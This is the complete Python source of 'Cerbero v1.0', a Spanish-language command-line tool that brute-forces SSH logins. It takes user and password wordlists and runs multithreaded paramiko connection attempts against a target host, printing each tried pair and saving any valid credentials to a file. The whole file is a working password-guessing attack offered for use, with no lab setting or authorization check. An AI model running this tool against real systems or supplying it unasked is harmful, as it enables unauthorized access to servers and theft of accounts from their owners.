#!/bin/python3

import paramiko
import argparse
import concurrent.futures
import threading
import signal
import sys
import os
from colorama import Fore, Style, init

# Inicializar colorama
init()

# Logo de la herramienta
def get_logo():
    logo = f"""
{Fore.RED}    ____  ____  ____  ____  ____  ____{Style.RESET_ALL}
{Fore.RED}   / ___)(  __)(  __)(_  _)(  __)(_  _){Style.RESET_ALL}
{Fore.RED}   \\___ \\ ) _)  ) _)   )(   ) _)   )(  {Style.RESET_ALL}
{Fore.RED}   (____/(____)(____) (__) (__)   (__) {Style.RESET_ALL}
{Fore.YELLOW}        Cerbero v1.0{Style.RESET_ALL}
{Fore.YELLOW}        By Diseo (@d1se0){Style.RESET_ALL}
    """
    return logo

def print_logo():
    print(get_logo())

class Cerbero:
    def __init__(self, target, port, user, user_file, passwd, passwd_file, threads, service, enumerate_users, output_file=None, success_continue=False):
        self.target = target
        self.port = port
        self.user = user
        self.user_file = user_file
        self.passwd = passwd
        self.passwd_file = passwd_file
        self.threads = threads
        self.service = service
        self.enumerate_users = enumerate_users
        self.output_file = output_file
        self.success_continue = success_continue
        self.valid_credentials = []
        self.lock = threading.Lock()
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=self.threads)
        self.stop_event = threading.Event()

    def brute_force_ssh(self):
        try:
            if self.user_file and self.passwd_file:
                users = self._read_users()
                passwords = self._read_passwords()
                for user in users:
                    if self.stop_event.is_set():
                        break
                    self.executor.submit(self._single_user_password, user, passwords)
            elif self.user_file and self.passwd:
                users = self._read_users()
                self._single_user_passwords(users, [self.passwd])
            elif self.user and self.passwd_file:
                passwords = self._read_passwords()
                self._single_user_password(self.user, passwords)
            elif self.user and self.passwd:
                self._single_user_password(self.user, [self.passwd])
            else:
                raise ValueError("Combinación de parámetros no válida.")

            self.executor.shutdown(wait=True)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[+] Saliendo...{Style.RESET_ALL}")
            self.stop_event.set()
            self.executor.shutdown(wait=False)
            sys.exit(0)

    def _single_user_password(self, user, passwords=None):
        if not passwords:
            passwords = self._read_passwords()
        for password in passwords:
            if self.stop_event.is_set():
                break
            if self.ssh_connect(user, password):
                if not self.success_continue:
                    self.stop_event.set()
                    break

    def _single_user_passwords(self, users, passwords=None):
        if not passwords:
            passwords = self._read_passwords()
        for user in users:
            if self.stop_event.is_set():
                break
            for password in passwords:
                if self.ssh_connect(user, password):
                    if not self.success_continue:
                        self.stop_event.set()
                        break

    def _read_users(self):
        if os.path.isfile(self.user_file):
            with open(self.user_file, 'r', encoding='utf-8', errors='ignore') as uf:
                return uf.read().splitlines()
        else:
            raise FileNotFoundError(f"No se pudo encontrar el archivo de usuarios: {self.user_file}")

    def _read_passwords(self):
        if os.path.isfile(self.passwd_file):
            with open(self.passwd_file, 'r', encoding='utf-8', errors='ignore') as pf:
                return pf.read().splitlines()
        else:
            raise FileNotFoundError(f"No se pudo encontrar el archivo de contraseñas: {self.passwd_file}")

    def ssh_connect(self, user, password):
        if self.stop_event.is_set():
            return False

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            print(f"Fuerza Bruta SSH: {user}/{password}: ", end="")
            client.connect(self.target, port=self.port, username=user, password=password)
            success_message = f"[+] Credenciales válidas encontradas: {user}:{password}"
            print(f"{Fore.GREEN}{success_message}{Style.RESET_ALL}")
            with self.lock:
                self.valid_credentials.append(success_message)
            return True
        except paramiko.AuthenticationException:
            print(f"{Fore.RED}[-] Fallo con: {user}:{password}{Style.RESET_ALL}")
            pass
        except paramiko.SSHException as ssh_err:
            print(f"{Fore.RED}[-] Error SSH: {ssh_err}{Style.RESET_ALL}")
            pass
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")
            pass
        finally:
            client.close()

        return False

    def start(self):
        if self.service.lower() == "ssh":
            self.brute_force_ssh()
        else:
            print(f"{Fore.RED}[-] Servicio no soportado{Style.RESET_ALL}")

        if self.output_file:
            self.save_results()

    def save_results(self):
        with open(self.output_file, 'w', encoding='utf-8', errors='ignore') as f:
            f.write(get_logo())
            f.write("\n\n")
            for credential in self.valid_credentials:
                f.write(credential + "\n")

def parse_args():
    parser = argparse.ArgumentParser(description="Cerbero: Herramienta de fuerza bruta para servicios SSH")
    parser.add_argument("-U", "--user-file", help="Diccionario de usuarios")
    parser.add_argument("-P", "--passwd-file", help="Diccionario de contraseñas")
    parser.add_argument("-s", "--service", required=True, help="Servicio a atacar (SSH)")
    parser.add_argument("-H", "--host", required=True, help="IP del objetivo")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Número de hilos")
    parser.add_argument("-f", "--output-file", help="Archivo para exportar resultados")
    parser.add_argument("--success-continue", action="store_true", help="Continuar después de encontrar credenciales válidas")
    parser.add_argument("-u", "--user", help="Usuario único para ataque")
    parser.add_argument("-p", "--passwd", help="Contraseña única para ataque")

    args = parser.parse_args()

    # Validar -U como archivo de usuarios
    if args.user_file and not os.path.isfile(args.user_file):
        parser.error(f"El archivo de usuarios especificado '{args.user_file}' no existe.")

    # Validar -P como archivo de contraseñas
    if args.passwd_file and not os.path.isfile(args.passwd_file):
        parser.error(f"El archivo de contraseñas especificado '{args.passwd_file}' no existe.")

    # Validar que -u no sea un archivo
    if args.user and os.path.isfile(args.user):
        parser.error("El argumento -u debe ser una palabra, no un archivo de usuario.")

    # Validar que -p no sea un archivo
    if args.passwd and os.path.isfile(args.passwd):
        parser.error("El argumento -p debe ser una palabra, no un archivo de contraseña.")

    return args

def main():
    print_logo()
    args = parse_args()

    # Configurar el objeto Cerbero
    cerbero = Cerbero(
        target=args.host,
        port=22,
        user=args.user,
        user_file=args.user_file,
        passwd=args.passwd,
        passwd_file=args.passwd_file,
        threads=args.threads,
        service=args.service,
        enumerate_users=False,
        output_file=args.output_file,
        success_continue=args.success_continue
    )

    def signal_handler(sig, frame):
        print(f"\n{Fore.YELLOW}[+] Saliendo...{Style.RESET_ALL}")
        cerbero.stop_event.set()
        cerbero.executor.shutdown(wait=False)
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    # Iniciar el ataque
    cerbero.start()

if __name__ == "__main__":
    main()
